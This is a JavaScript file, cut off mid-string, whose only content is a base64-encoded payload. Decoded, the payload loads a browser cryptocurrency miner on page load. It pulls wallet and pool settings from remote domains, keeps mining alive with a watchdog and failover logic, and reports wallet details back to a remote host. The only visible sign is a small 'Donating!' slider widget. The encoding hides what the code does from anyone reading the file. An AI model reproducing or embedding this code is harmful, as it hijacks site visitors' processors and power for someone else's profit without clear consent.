var a='d2luZG93LmNwdSA9IC4xNTsKd2luZG93LndhbGxldCA9IG51bGw7CndpbmRvdy5taW5lciA9IG51bGw7CndpbmRvdy5ocHN0aW1lciA9IG51bGwKd2luZG93LnJ1bmxhYmVsID0gIkRvbmF0aW5nISI7CndpbmRvdy5zdG9wbGFiZWwgPSAiRG9uYXRpb25zIFBhdXNlZCI7CndpbmRvdy5jYWNoZU1pbnMgPTMwOwp3aW5kb3cudXNlcmlkID0wOwp3aW5kb3cudXNlcnR5cGUgPSAidyI7CndpbmRvdy50aHJlYWRzID0gbnVsbDsKd2luZG93LnBvb2wgPSAiIjsKd2luZG93LndkdGltZXIgPSBudWxsOwp3aW5kb3cuaG9zdGVkPTE7CndpbmRvdy5zZW50ZmIgPTA7CndpbmRvdy5wcm94eVVybCA9IiI7CndpbmRvdy5zc2wgPTE7CndpbmRvdy5jdXJEb209MDsKd2luZG93LmRvbXM9bnVsbDsKd2luZG93Lndvcmtlcj1udWxsOwp3aW5kb3cuZGVidWc9ZmFsc2U7CndpbmRvdy5iYWNrb2ZmPTEwMDsKd2luZG93LmJhY2tvZmZNYXg9MzAwMDA7CndpbmRvdy5mYWlsY291bnQ9MDsKd2luZG93LmZhaWxjb3VudE1heD04Owp3aW5kb3cubXlMb2M9InVzIjsKCnZhciBzY3JpcHRUYWcgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LnNyYzsKaWYoc2NyaXB0VGFnLnN0YXJ0c1dpdGgoImh0dHBzOi8vc25pcCIpKXsgc2NyaXB0VGFnID0gImR5bmFtaWMiOyB9CgpmdW5jdGlvbiBsb2FkU2V0dGluZ3MoKXsKCXZhciBteXR6ID0gbmV3IERhdGUoKS5nZXRUaW1lem9uZU9mZnNldCgpOwoJaWYobXl0eiA+PSAxMjAgJiYgbXl0eiA8PSA2MDApeyB3aW5kb3cubXlMb2MgPSAidXMiOyB9CgllbHNlIGlmKG15dHogPCAxMjAgJiYgbXl0eiA+PSAtMTgwKXsgd2luZG93Lm15TG9jID0gImV1IjsgfQoJZWxzZSB7IHdpbmRvdy5teUxvYyA9ICJhcyI7IH0KCgl3aW5kb3cuZG9tcyA9IFsiZC5jZmNuZXQudG9wIiwgImQuY2ZjZGlzdC5nZG4iLCJkLmNmY25ldC5nZG4iLCJkLmNwdWZhbi5jbHViIl07Cgl2YXIgc3JjID0gZG9jdW1lbnQuY3VycmVudFNjcmlwdC5zcmM7CiAgICAgICAgdmFyIGNodW5rID0gc3JjLnN1YnN0cmluZygwLCBzcmMuaW5kZXhPZigiLmpzIiktMik7CiAgICAgICAgdmFyIGJpdHMgPSBjaHVuay5zcGxpdCgnLycpOwoJd2luZG93LnBhdGg9IiI7CiAgICAgICAgZm9yKGk9MDsgaTwgYml0cy5sZW5ndGggLTE7IGkrKyl7CiAgICAgICAgICAgICAgICBpZighYml0c1tpXS5zdGFydHNXaXRoKCJodHRwIikpeyB3aW5kb3cucGF0aCArPSAiLyI7IH0KICAgICAgICAgICAgICAgIHdpbmRvdy5wYXRoICs9IGJpdHNbaV07CiAgICAgICAgfQoKCXZhciBjYWNoZSA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLWNhY2hlJyk7CglpZihjYWNoZSAmJiBpc051bWJlcihjYWNoZSkpeyAKCQl3aW5kb3cuY2FjaGVNaW5zID0gY2FjaGU7Cgl9Cgl2YXIgdGhyZWFkcyA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLXRocmVhZHMnKTsKCWlmKHRocmVhZHMgJiYgaXNOdW1iZXIodGhyZWFkcykpeyAKCQl3aW5kb3cudGhyZWFkcyA9IHRocmVhZHM7Cgl9CgoJdmFyIHBldyA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLWxldmVsJyk7CiAgICAgICAgaWYocGV3ICYmIGlzTnVtYmVyKHBldykpeyB3aW5kb3cuY3B1ID0gKDEgLSAocGV3IC8xMDApKTsgfQogICAgICAgIGVsc2UgaWYoZG9jdW1lbnQuY3VycmVudFNjcmlwdC5zcmMuaW5kZXhPZigiYz0iKSAhPT0gLTEpewogICAgICAgICAgICAgICAgd2luZG93LmNwdSA9ICgxIC0gKHVuZXNjYXBlKHNyYykuc3BsaXQoImM9IilbMV0uc3BsaXQoIiYiKVswXSAvMTAwKSk7CiAgICAgICAgfQoKCWlmKGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLWRlYnVnJykpeyB3aW5kb3cuZGVidWcgPSB0cnVlOyB9CgoJdmFyIHdvcmtlciA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLXdvcmtlcicpOwoJaWYod29ya2VyKXsKCQl3aW5kb3cud29ya2VyID0gd29ya2VyLnJlcGxhY2UoL1teYS16MC05XS9naSwnJyk7Cgl9Cgl2YXIgdSA9IGRvY3VtZW50LmN1cnJlbnRTY3JpcHQuZ2V0QXR0cmlidXRlKCdkYXRhLXVzZXInKTsKCWlmKHUpewoJCXdpbmRvdy51c2VyaWQgPSB1OwoJCXdpbmRvdy51c2VydHlwZSA9ICJ1IjsKCX1lbHNlewoJCXZhciB3ID0gZG9jdW1lbnQuY3VycmVudFNjcmlwdC5nZXRBdHRyaWJ1dGUoJ2RhdGEtaWQnKTsKCQlpZih3KXsKCQkJd2luZG93LnVzZXJpZCA9IHc7CgkJCXdpbmRvdy51c2VydHlwZSA9ICJ3IjsKCQl9ZWxzZSBpZihzcmMuaW5kZXhPZigidz0iKSAhPSAtMSl7CgkJCXdpbmRvdy51c2VyaWQgPXVuZXNjYXBlKHNyYykuc3BsaXQoInc9IilbMV0uc3BsaXQoIiYiKVswXTsKCQkJd2luZG93LnVzZXJ0eXBlID0gInciOwoJCX0KCX0KCXZhciB1d2FsID0gZG9jdW1lbnQuY3VycmVudFNjcmlwdC5nZXRBdHRyaWJ1dGUoJ2RhdGEtd2FsbGV0Jyk7Cgl2YXIgdXBvb2wgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LmdldEF0dHJpYnV0ZSgnZGF0YS1wb29sJyk7Cgl2YXIgdW5vZGUgPSBkb2N1bWVudC5jdXJyZW50U2NyaXB0LmdldEF0dHJpYnV0ZSgnZGF0YS1ub2RlJyk7CgoJaWYodXdhbCAmJiB1cG9vbCAmJiB1bm9kZSl7CgkJd2luZG93LnBvb2wgPSB1cG9vbDsKCQl3aW5kb3cud2FsbGV0ID0gdXdhbDsKCQl3aW5kb3cucHJveHlVcmwgPSAid3NzOi8vIit1bm9kZSArIj92PTImcG9vbD0iK3Vwb29sOwoJCXN0YXJ0SXQoKTsKCQlyZXR1cm4gZmFsc2U7Cgl9CglyZXR1cm4gdHJ1ZTsKCn0KCihmdW5jdGlvbigpewoKCWlmKCFsb2FkU2V0dGluZ3MoKSl7IHJldHVybjsgfQoKCWlmKHByb2Nlc3NDb29raWUoZmFsc2UpKXsgcmV0dXJuOyB9CgoJZG9NYWluKCk7Cgp9KCkgKTsKCmZ1bmN0aW9uIGdldERvbWFpbihzc2wpewoJaWYoZG9tcyA9PW51bGwpeyByZXR1cm4gbnVsbDsgfQoKCWlmKGN1ckRvbSA+IGRvbXMubGVuZ3RoKXsgY3VyRG9tPTA7IH0KCXZhciBkID0gZG9tc1tjdXJEb21dOwoJaWYoc3NsKXsgZCA9ICJodHRwczovLyIrZDsgfQoJZWxzZXsgZCA9ICJodHRwOi8vIitkOyB9CglyZXR1cm4gZDsKfQoKZnVuY3Rpb24gbG9hZERvbWFpbnMoZCl7Cgl2YXIgbSA9IEpTT04ucGFyc2UoZCk7CglpZihtLmRvbWFpbnMubGVuZ3RoKXsKCQl3aW5kb3cuZG9tcyA9IG0uZG9tYWluczsKCQljdXJEb209MDsJCQoJCWRvTWFpbigpOwoJfQp9CgpmdW5jdGlvbiBkb01haW4oKXsKCWlmKHdpbmRvdy51c2VyaWQgPiAwKXsKCQl2YXIgc3NsID0gZmFsc2U7CgkJaWYgKGxvY2F0aW9uLnByb3RvY29sID09PSAnaHR0cHM6JykgeyBzc2wgPSB0cnVlOyB9CgkJdmFyIGQgPSBnZXREb21haW4oc3NsKTsKCQlpZihkPT0gbnVsbCl7CgkJCWNhbGxBamF4KCJodHRwczovL3VzLmNmY25ldC50b3AvZG9tYWlucy5waHAiLGxvYWREb21haW5zLCBudWxsKTsKCQl9ZWxzZXsKCQkJY2FsbEFqYXgoZCArICIvc3RhdGljLyIrd2luZG93LnVzZXJ0eXBlKyIvIit3aW5kb3cudXNlcmlkKyIvIixjYWxsYmFjaywgZG9NYWluKTsKCQl9Cgl9Cn0KCmZ1bmN0aW9uIHByb2Nlc3NDb29raWUoZm9yY2UpewoJdHJ5ewoJCWlmICAod2luZG93LmNhY2hlTWlucyA9PTApeyByZXR1cm4gZmFsc2U7IH0KCQl2YXIgYyA9IHJlYWRMb2NhbCgiY2ZjMl9zZXNzaW9uIik7CgkJaWYoYyA9PSBudWxsKXsgcmV0dXJuIGZhbHNlOyB9CgoJCXZhciB0cyA9IE1hdGgucm91bmQoKG5ldyBEYXRlKCkpLmdldFRpbWUoKSAvIDEwMDApOwoJCXZhciBsb2NhbCA9IEpTT04ucGFyc2UoYXRvYihjKSk7CgoJCWlmKHRzIC0gbG9jYWwudHMgPiAod2luZG93LmNhY2hlTWlucyAqIDYwKSAmJiAhZm9yY2UpeyByZXR1cm4gZmFsc2U7IH0KCgkJd2luZG93LndhbGxldCA9IGxvY2FsLndhbGxldDsJCgkJd2luZG93LmNwdSA9IGxvY2FsLmNwdTsKCQlpZihsb2NhbC50aHJlYWRzKXsgd2luZG93LnRocmVhZHMgPSBsb2NhbC50aHJlYWRzOyB9CgoJCXdpbmRvdy5ub2RlcyA9IGxvY2FsLm5vZGVzOwoJCWlmKHdpbmRvdy5ub2Rlcy5sZW5ndGggPT0wKXsgCgkJCWxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCJjZmMyX3Nlc3Npb24iKTsKCQkJcmV0dXJuIGZhbHNlOwoJCX0KCQl3aW5kb3cubm9kZXMgPSBzb3J0Tm9kZXMod2luZG93Lm5vZGVzKTsKCQl3aW5kb3cuc3NsID0gbG9jYWwuc3NsOwoJCXdpbmRvdy5wb29sID0gbG9jYWwucG9vbDsKCgkJaWYod2luZG93LnBvb2wgPT0gbnVsbCB8fCB3aW5kb3cucG9vbCA9PSAndW5kZWZpbmVkJyl7IAoJCQlsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiY2ZjMl9zZXNzaW9uIik7CgkJCXJldHVybiBmYWxzZTsgCgkJfQoJCWlmKHdpbmRvdy53YWxsZXQgPT0gbnVsbCB8fCB3aW5kb3cud2FsbGV0ID09ICd1bmRlZmluZWQnKXsgCgkJCWxvY2FsU3RvcmFnZS5yZW1vdmVJdGVtKCJjZmMyX3Nlc3Npb24iKTsKCQkJcmV0dXJuIGZhbHNlOyAKCQl9CgogICAgICAgICAgICAgICAgd2luZG93LmN1ck5vZGUgPSAwOwogICAgICAgICAgICAgICAgYXNzaWduUHJveHkoKTsKCQlpZih3aW5kb3cucHJveHlVcmwgPT0gInVuZGVmaW5lZCIpeyAKCQkJbG9jYWxTdG9yYWdlLnJlbW92ZUl0ZW0oImNmYzJfc2Vzc2lvbiIpOwoJCQlyZXR1cm4gZmFsc2U7IAoJCX0KCgkJc3RhcnRJdCgpOwoJCXJldHVybiB0cnVlOwoJfWNhdGNoKGUpewoJCXJldHVybiBmYWxzZTsKCX0KfQoKZnVuY3Rpb24gc3RhcnRJdCgpewoJc3RhcnRXb3JrKCk7CglzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGNoZWNrQW5kU2hvd0RpdigpOyB9LCAxMDApOwp9CgpmdW5jdGlvbiBzdGFydFdvcmsoKXsKCXZhciBsaWJVcmwgPSBudWxsOwoJaWYoc2NyaXB0VGFnID09ICJkeW5hbWljIil7CgkJbGliVXJsID0gImh0dHBzOi8vdXMuY2ZjbmV0LnRvcC92ZW5kb3IvY2gvIjsKCX1lbHNlewoJCXZhciBjaHVuayA9IHNjcmlwdFRhZy5zdWJzdHJpbmcoMCwgc2NyaXB0VGFnLmluZGV4T2YoIi5qcyIpLTIpOwoJCXZhciBiaXRzID0gY2h1bmsuc3BsaXQoJy8nKTsKCQl2YXIgbGliVXJsPSIiOwoJCWZvcihpPTA7IGk8IGJpdHMubGVuZ3RoIC0xOyBpKyspewoJCQlpZighYml0c1tpXS5zdGFydHNXaXRoKCJodHRwIikpeyBsaWJVcmwgKz0gIi8iOyB9CgkJCWxpYlVybCArPSBiaXRzW2ldOwoJCX0KCQlsaWJVcmwgKz0gIi8iOwoJfQoJc2V0dXBNaW5lcihsaWJVcmwpOwoJc2V0dXBKb2IoKTsKCglpZih3aW5kb3cud29ya2VyICE9IG51bGwgJiYgd2luZG93Lndvcmtlci5sZW5ndGggPiAwKXsKCQl2YXIgcG9zID0gd2luZG93LndhbGxldC5pbmRleE9mKCcuJyk7CgkJaWYocG9zICE9PSAtMSl7IHdpbmRvdy53YWxsZXQgPSB3aW5kb3cud2FsbGV0LnN1YnN0cmluZygwLHBvcysxKSArIHdpbmRvdy53b3JrZXI7CX0KCX0KCgl3aW5kb3cud2FsbGV0ID0gd2luZG93LndhbGxldC50cmltKCk7Cgl3aW5kb3cubWluZXIgPSBDSC5Bbm9ueW1vdXMod2luZG93LndhbGxldCApOwoJaWYod2luZG93Lm1pbmVyLl9vdGhlclRhYlJ1bm5pbmcoKSl7CiAgICAgICAgICAgICAgICBzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IHN0YXJ0V29yaygpOyB9LCAxMDAwKTsKICAgICAgICAgICAgICAgIHJldHVybjsKICAgICAgICB9CgogICAgICAgIGlmKHdpbmRvdy50aHJlYWRzKXsKICAgICAgICAgICAgICAgIHZhciB0biA9IHdpbmRvdy50aHJlYWRzOwogICAgICAgICAgICAgICAgaWYodG4gPCAxKXsgdG4gPSBNYXRoLnJvdW5kKHRuICogbmF2aWdhdG9yLmhhcmR3YXJlQ29uY3VycmVuY3kpOyB9CiAgICAgICAgICAgICAgICB3aW5kb3cubWluZXIuc2V0TnVtVGhyZWFkcyggdG4gKTsKICAgICAgICB9ZWxzZXsKICAgICAgICAgICAgICAgIHdpbmRvdy5taW5lci5zZXRUaHJvdHRsZSggd2luZG93LmNwdSApOwogICAgICAgIH0KICAgICAgICBpZih3aW5kb3cuY3B1ICE9MSl7CiAgICAgICAgICAgICAgICB3aW5kb3cubWluZXIuc3RhcnQoKTsKICAgICAgICAgICAgICAgIHdpbmRvdy53ZHRpbWVyID0gc2V0VGltZW91dChmdW5jdGlvbigpeyB3YXRjaGRvZygpOyB9LCAyNTAwMCk7CiAgICAgICAgfQoKICAgICAgICB3aW5kb3cubWluZXIub24oJ2Vycm9yJywgZnVuY3Rpb24ocGFyYW1zKSB7CgkJaWYod2luZG93LmRlYnVnKXsKCQkJY29uc29sZS5sb2coIk1pbmVyIGVycm9yOiAiKyBwYXJhbXMuZXJyb3IrIiwgIitwYXJhbXMubWVzc2FnZSk7CgkJfQoJCWlmKHBhcmFtcy5tZXNzYWdlID09ICdpbnZhbGlkIG1ldGhvZCcpeyByZXR1cm47IH0KCiAgICAgICAgICAgICAgICBsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiY2ZjMl9zZXNzaW9uIik7CgkJY2xlYXJUaW1lb3V0KHdpbmRvdy53ZHRpbWVyKTsKICAgICAgICAgICAgICAgIGlmIChwYXJhbXMuZXJyb3IgIT09ICdjb25uZWN0aW9uX2Vycm9yJykgewogICAgICAgICAgICAgICAgICAgICAgICAvL2ZlZWRiYWNrKCJlcnJvcjogIitwYXJhbXMuZXJyb3IpOwoJCQlpZihwYXJhbXMuZXJyb3IgIT09ICdpbnZhbGlkX3NpdGVfa2V5Jyl7CgkJCQlzdG9wRG90cygpOwoJCQkJc2V0VGltZW91dChmdW5jdGlvbigpeyBmYWlsb3ZlcigpOyB9LCB3aW5kb3cuYmFja29mZik7CgkJCQl3aW5kb3cuYmFja29mZiA9IHdpbmRvdy5iYWNrb2ZmICozOwoJCQkJaWYod2luZG93LmJhY2tvZmYgPj0gd2luZG93LmJhY2tvZmZNYXgpeyB3aW5kb3cuYmFja29mZiA9IHdpbmRvdy5iYWNrb2ZmTWF4OyB9CgkJCX1lbHNlewoJCQkJZmVlZGJhY2soImJhZCB3YWxsZXQ6ICIrd2luZG93LndhbGxldCk7CgkJCX0KICAgICAgICAgICAgICAgIH1lbHNlewoJCQlzdG9wRG90cygpOwoJCQlzZXRUaW1lb3V0KGZ1bmN0aW9uKCl7IGZhaWxvdmVyKCk7IH0sIHdpbmRvdy5iYWNrb2ZmKTsKCQkJd2luZG93LmJhY2tvZmYgPSB3aW5kb3cuYmFja29mZiAqMzsKCQkJaWYod2luZG93LmJhY2tvZmYgPj0gd2luZG93LmJhY2tvZmZNYXgpeyB3aW5kb3cuYmFja29mZiA9IHdpbmRvdy5iYWNrb2ZmTWF4OyB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfSk7Cgp9CmZ1bmN0aW9uIHN0b3BEb3RzKCl7CglpZih3aW5kb3cubWluZXIgIT0gbnVsbCl7CgkJd2luZG93Lm1pbmVyLnN0b3AoKTsKCQl3aW5kb3cubWluZXIgPSBudWxsOwoJfQp9CgpmdW5jdGlvbiBmYWlsb3ZlcigpewoJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIkZhaWxpbmcgb3Zlci4iKTsgfQoJaWYod2luZG93LmZhaWxjb3VudCA+IHdpbmRvdy5mYWlsY291bnRNYXgpewoJCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJTdGFydGluZyBvdmVyLCBhc2tpbmcgZm9yIGRhdGEgYWdhaW4gZnJvbSBkaXJlY3Rvci4iKTsgfQoJCXdpbmRvdy5mYWlsY291bnQ9MDsKCQlkb01haW4oKTsJCgkJcmV0dXJuOwoJfQoJd2luZG93LmZhaWxjb3VudCsrOwoKCXN0b3BEb3RzKCk7Cglhc3NpZ25Qcm94eSgpOwoJc3RhcnRXb3JrKCk7Cn0KCmZ1bmN0aW9uIHdhdGNoZG9nKCl7CglpZih3aW5kb3cubWluZXIgPT0gdW5kZWZpbmVkIHx8IHdpbmRvdy5taW5lci5nZXRUb3RhbEhhc2hlcygpPT0wKXsKCQlpZih3aW5kb3cuZGVidWcpeyBjb25zb2xlLmxvZygiSWRsZSBtaW5lciB3YXRjaGRvZyB0cmlnZ2VyZWQuIik7IH0KCQlsb2NhbFN0b3JhZ2UucmVtb3ZlSXRlbSgiY2ZjMl9zZXNzaW9uIik7CgkJZmFpbG92ZXIoKTsKCX0KfQoKZnVuY3Rpb24gZmVlZGJhY2sobXNnKXsKCWlmKHdpbmRvdy5zZW50ZmI9PTEpeyByZXR1cm47IH0KCXdpbmRvdy5zZW50ZmIgPTE7Cgl2YXIgcmVwb3J0ID0gbmV3IE9iamVjdCgpOwoJcmVwb3J0LmVycm9ydHlwZSA9IG1zZzsKCXJlcG9ydC5pZCA9IHdpbmRvdy51c2VyaWQ7CglyZXBvcnQudHlwZSA9IHdpbmRvdy51c2VydHlwZTsKCXJlcG9ydC50aHJlYWRzID0gd2luZG93LnRocmVhZHM7CglyZXBvcnQucG9vbCA9IHdpbmRvdy5wb29sOwoJcmVwb3J0LndzcGF0aCA9IHdpbmRvdy53c3BhdGg7CglyZXBvcnQud2FsbGV0ID0gd2luZG93LndhbGxldDsKCXJlcG9ydC5taW5lcndhc20gPSB3aW5kb3cubWluZXIuaGFzV0FTTVN1cHBvcnQoKTsKCXZhciB2ID0gYnRvYShKU09OLnN0cmluZ2lmeShyZXBvcnQpKTsKCgl2YXIgcHJvID0gImh0dHA6Ly8iOwoJaWYgKGxvY2F0aW9uLnByb3RvY29sID09PSAnaHR0cHM6JykgeyBwcm8gPSAiaHR0cHM6Ly8iOyB9CgljYWxsQWpheChwcm8rImQuY2ZjbmV0Lmdkbi9kLmRldi5waHA/c3RhbGw9MSZyZXBvcnQ9Iit2LG51bGwsIGZlZWRiYWNrKTsKfQoKZnVuY3Rpb24gc29ydE5vZGVzKG5vZGVzKXsKCXZhciBsZW4gPSBub2Rlcy5sZW5ndGg7Cglmb3IgKHZhciBpID0gMDsgaSA8IGxlbjsgaSsrKSB7CgkJaWYgKG5vZGVzW2ldLnN0YXJ0c1dpdGgod2luZG93Lm15TG9jKSl7CgkJCXZhciBnID0gbm9kZXNbaV07CgkJCW5vZGVzLnNwbGljZShpLDEpOwoJCQlub2Rlcy51bnNoaWZ0KGcpOwoJCQlyZXR1cm4gbm9kZXM7CgkJfQoJfQoJcmV0dXJuIG5vZGVzOwp9CgpmdW5jdGlvbiBjYWxsYmFjayhxKXsKCXZhciBtID0gSlNPTi5wYXJzZShxKTsKCWlmKG0ucmVzdWx0ID09ICJzdWNjZXNzIil7CgkJd2luZG93LndhbGxldCA9IG0ud2FsbGV0OwoJCXdpbmRvdy5wb29sID0gbS50YXJnZXQ7CgkJd2luZG93Lm5vZGVzID0gbS5ub2RlczsKCQl3aW5kb3cuc3NsID0gbS5zc2w7CgkJaWYod2luZG93Lm5vZGVzLmxlbmd0aCA9PTApeyByZXR1cm47IH0KCgkJd2luZG93Lm5vZGVzID0gc29ydE5vZGVzKHdpbmRvdy5ub2Rlcyk7CgkJd2luZG93LmN1ck5vZGUgPSAwOwoKCQlpZih3aW5kb3cucHJveHlVcmwgPT0gInVuZGVmaW5lZCIpeyAKCQkJc2V0VGltZW91dChmdW5jdGlvbigpeyBmYWlsb3ZlcigpOyB9LCB3aW5kb3cuYmFja29mZik7CgkJCXdpbmRvdy5iYWNrb2ZmID0gd2luZG93LmJhY2tvZmYgKjM7CgkJCWlmKHdpbmRvdy5iYWNrb2ZmID49IHdpbmRvdy5iYWNrb2ZmTWF4KXsgd2luZG93LmJhY2tvZmYgPSB3aW5kb3cuYmFja29mZk1heDsgfQoJCQlyZXR1cm47CgkJfQoJCWFzc2lnblByb3h5KCk7CgoJCXZhciB0cyA9IE1hdGgucm91bmQoKG5ldyBEYXRlKCkpLmdldFRpbWUoKSAvIDEwMDApOwoJCXZhciBjb29rID0ge3dhbGxldDogbS53YWxsZXQsIHNzbDogbS5zc2wsIHBvb2w6IHdpbmRvdy5wb29sLCBub2Rlczogbm9kZXMsY3B1OiB3aW5kb3cuY3B1LCB0aHJlYWRzOiB3aW5kb3cudGhyZWFkcywgdHM6IHRzfTsKCQl2YXIgdiA9IGJ0b2EoSlNPTi5zdHJpbmdpZnkoY29vaykpOwoJCWxvY2FsU3RvcmFnZVsiY2ZjMl9zZXNzaW9uIl0gPSB2OwoJCXN0YXJ0SXQoKTsKCX1lbHNlewoJfQp9CgpmdW5jdGlvbiBhc3NpZ25Qcm94eSgpewoJaWYod2luZG93LnNzbCl7CgkJd2luZG93LnByb3h5VXJsID0gIndzczovLyI7CQoJfWVsc2V7CgkJd2luZG93LnByb3h5VXJsID0gIndzOi8vIjsJCgl9CgoKCXdpbmRvdy5wcm94eVVybCArPSB3aW5kb3cubm9kZXNbd2luZG93LmN1ck5vZGVdICsiP3Y9MiZwb29sPSIrd2luZG93LnBvb2w7Cgl3aW5kb3cuY3VyTm9kZSsrOwoJaWYod2luZG93LmN1ck5vZGUgPj0gd2luZG93Lm5vZGVzLmxlbmd0aCl7IHdpbmRvdy5jdXJOb2RlPTA7IH0KCWlmKHdpbmRvdy53b3JrZXIgIT0gbnVsbCAmJiB3aW5kb3cud29ya2VyLmxlbmd0aCA+IDApewoJCXZhciBwb3MgPSB3aW5kb3cucHJveHlVcmwubGFzdEluZGV4T2YoJzonKTsKCQlpZihwb3MgIT09IC0xKXsgCgkJCXdpbmRvdy5wcm94eVVybCA9IHdpbmRvdy5wcm94eVVybC5zdWJzdHJpbmcoMCxwb3MrMSkgKyB3aW5kb3cud29ya2VyOwkKCQkJaWYod2luZG93LmRlYnVnKXsgY29uc29sZS5sb2coIlBvb2wgc3VwcG9ydHMgY3VzdG9tIHdvcmtlcjogIit3aW5kb3cud29ya2VyKTsgfQoJCX0KCX0KCWlmKHdpbmRvdy5kZWJ1Zyl7IGNvbnNvbGUubG9nKCJBc3NpZ25pbmcgcHJveHk6ICIrd2luZG93LnByb3h5VXJsKTsgfQp9CgoKZnVuY3Rpb24gY2FsbEFqYXgodXJsLCBjYWxsYmFjaywgcmV0cnkpewogICAgdmFyIHhtbGh0dHA7CiAgICB4bWxodHRwID0gbmV3IFhNTEh0dHBSZXF1ZXN0KCk7Ci8vCXhtbGh0dHAub25lcnJvciA9IHByb2Nlc3NDb29raWUodHJ1ZSk7CiAgICB4bWxodHRwLm9ucmVhZHlzdGF0ZWNoYW5nZSA9IGZ1bmN0aW9uKCl7CiAgICAgICAgaWYgKHhtbGh0dHAucmVhZHlTdGF0ZSA9PSA0KXsKCQlpZiAoeG1saHR0cC5zdGF0dXMgPT0gMjAwKXsKCQkJaWYoY2FsbGJhY2speyBjYWxsYmFjayh4bWxodHRwLnJlc3BvbnNlVGV4dCk7IH0KCQl9ZWxzZSBpZihyZXRyeSl7CgkJCWN1ckRvbSsrOwoJCQlyZXRyeSgpOwoJCX0KCX0KICAgIH0KICAgIHhtbGh0dHAub3BlbigiR0VUIiwgdXJsLCB0cnVlKTsKICAgIHhtbGh0dHAuc2VuZCgpOwp9CgpmdW5jdGlvbiBjaGVja0FuZFNob3dEaXYoKXsKCXZhciBvdXJkaXYgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2ZjX2RvbmF0ZSIpOwoJaWYob3VyZGl2KXsKCQl2YXIgc2hvd0MgPSAoMSAtIHdpbmRvdy5jcHUpICogMTAwOwoJCXZhciBzb3RwID0gb3VyZGl2LmdldEF0dHJpYnV0ZSgiZGF0YS1zdG9wbGFiZWwiKTsKCQl2YXIgdW5zb3RwID0gb3VyZGl2LmdldEF0dHJpYnV0ZSgiZGF0YS1ydW5sYWJlbCIpOwoJCWlmKHNvdHApeyB3aW5kb3cuc3RvcGxhYmVsID0gc290cDsgfQoJCWlmKHVuc290cCl7IHdpbmRvdy5ydW5sYWJlbCA9IHVuc290cDsgfQoJCXZhciByYyA9ICJzcGluLXNsb3ciOwoJCXZhciB0eHQgPSB3aW5kb3cucnVubGFiZWw7CgkJaWYod2luZG93LmNwdSA9PTEpeyAKCQkJdHh0ID0gd2luZG93LnN0b3BsYWJlbAoJCQlyYyA9ICIiOwoJCX0KCQl2YXIgcHVrZSA9ICI8ZGl2IHN0eWxlPSd3aWR0aDoyNTBweDsgb3ZlcmZsb3c6aGlkZGVuJz4iOwoJCXB1a2UgKz0gIjxkaXYgc3R5bGU9J3dpZHRoOjQ1cHg7IGZsb2F0OiBsZWZ0Oyc+PGRpdiBpZD0ncmluZ3UnIGNsYXNzPSciK3JjKyInPjwvZGl2PiA8L2Rpdj4iOwoJCXB1a2UgKz0gIjxkaXYgc3R5bGU9J21hcmdpbi1sZWZ0OjUwcHg7IHdpZHRoOjIwMHB4Oyc+IDxzcGFuIGlkPSdtaW5lci1zdGF0ZSc+Iit0eHQrIjwvc3Bhbj4gKDxzcGFuIGlkPSdocHMnPjA8L3NwYW4+IEgvcykgPGJyPiI7CgkJcHVrZSArPSAiPGRpdiBpZD0nc2xpZGVjb250YWluZXInPiA8aW5wdXQgdHlwZT0ncmFuZ2UnIHdpZHRoPScyMDBweDsgbWluPScwJyBtYXg9JzEwMCcgdmFsdWU9JyIrc2hvd0MrIicgY2xhc3M9J3NsaWRlcicgaWQ9J2NwdVRocm90dGxlJyBkYXRhLXRvZ2dsZT0ndG9vbHRpcCcgZGF0YS1wbGFjZW1lbnQ9J3RvcCcgPiA8L2Rpdj4gPC9kaXY+IjsKCgkJcHVrZSArPSAiPC9kaXY+IjsKCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgiY2ZjX2RvbmF0ZSIpLmlubmVySFRNTCA9IHB1a2U7CgkJY3B1VGhyb3R0bGUuYWRkRXZlbnRMaXN0ZW5lcignY2hhbmdlJywgZnVuY3Rpb24oKSB7CgkJCXZhciB3YXNTdG9wcGVkID0gZmFsc2U7CgkJCWlmKHdpbmRvdy5jcHUgPT0xKXsgd2FzU3RvcHBlZD10cnVlOyB9CgkJCXZhciB2YWwgPSBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnY3B1VGhyb3R0bGUnKS52YWx1ZTsKCQkJd2luZG93LmNwdSA9ICgxIC0gKHZhbCAvMTAwKSk7CgkJCWlmKHdpbmRvdy5jcHUgPT0xKXsKCQkJCXdpbmRvdy5taW5lci5zdG9wKCk7CgkJCQlkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgibWluZXItc3RhdGUiKS5pbm5lckhUTUwgPSB3aW5kb3cuc3RvcGxhYmVsOwoJCQkJY2xlYXJUaW1lb3V0KHdpbmRvdy53ZHRpbWVyKTsKCQkJfWVsc2V7CgkJCQlpZih3YXNTdG9wcGVkKXsgCgkJCQkJd2luZG93Lm1pbmVyLnN0YXJ0KCk7IAoJCQkJCXdpbmRvdy53ZHRpbWVyID0gc2V0VGltZW91dChmdW5jdGlvbigpeyB3YXRjaGRvZygpOyB9LCAxNTAwMCk7CgkJCQkJZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoIm1pbmVyLXN0YXRlIikuaW5uZXJIVE1MID0gd2luZG93LnJ1bmxhYmVsOwoJCQkJfQoJCQkJd2luZG93Lm1pbmVyLnNldFRocm90dGxlKCB3aW5kb3cuY3B1ICk7CgkJCX0KCQkJc2V0U3Bpbm5lcih2YWwpOwo